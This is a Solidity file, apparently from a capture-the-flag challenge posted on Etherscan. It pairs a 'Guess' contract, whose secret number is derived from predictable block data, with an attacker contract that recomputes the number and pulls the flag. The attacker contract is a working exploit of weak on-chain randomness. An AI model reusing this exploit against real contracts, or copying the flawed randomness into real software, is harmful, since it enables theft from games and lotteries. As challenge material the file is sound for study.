/**
 *Submitted for verification at Etherscan.io on 2021-10-28
*/

pragma solidity ^0.4.23;

contract Guess{
    address owner;
    string private flag; // omitted
    mapping (address => bool) public allowed;

    function Guess() public
    {
        owner = msg.sender;
    }

    function guess(uint _guessNumber) public
    {
        uint guessNumber = (uint(keccak256(block.number - 1)) + uint(block.blockhash(block.number - 1))) % 100000;
        if (guessNumber == _guessNumber)
        {
            allowed[msg.sender] = true;
        }
    }
    
    function retrieveFlag() public view returns(string)
    {
        require(allowed[msg.sender]);
        return decrypt(flag);
    }

    function decrypt(string flag) private returns(string)
    {
        // omitted
    }
}

contract Existing  {
    
    Guess deployed;
    
    mapping (address => uint) public allowed;
    
    function Existing(address _t) public 
    {
        deployed = Guess(_t);
    }
 
    function getA(uint) public view returns (string)
    {
        uint guessNumber = (uint(keccak256(block.number - 1)) + uint(block.blockhash(block.number - 1))) % 100000;
        deployed.guess(guessNumber);
        return deployed.retrieveFlag();
    }
    
    function guessfind() public view returns(uint)
    {
        uint guessNumber = (uint(keccak256(block.number - 1)) + uint(block.blockhash(block.number - 1))) % 100000;
        return guessNumber;
    }
    
    function allowed() public view returns (string)
    {
        uint guessNumber = (uint(keccak256(block.number - 1)) + uint(block.blockhash(block.number - 1))) % 100000;
        //deployed.guess(guessNumber);
        //deployed.allowed(0x8C5D69406fAeA8EcA6638F99E2a1B0A4Eb8c8e4B);
        return deployed.retrieveFlag();////////
    }
    
    function show_flag() public view returns (string, bool)
    {
        uint guessNumber = (uint(keccak256(block.number - 1)) + uint(block.blockhash(block.number - 1))) % 100000;
        deployed.guess(guessNumber);
        bool allow = deployed.allowed(0x8C5D69406fAeA8EcA6638F99E2a1B0A4Eb8c8e4B);
        return (deployed.retrieveFlag(), allow);
    }
    
    
}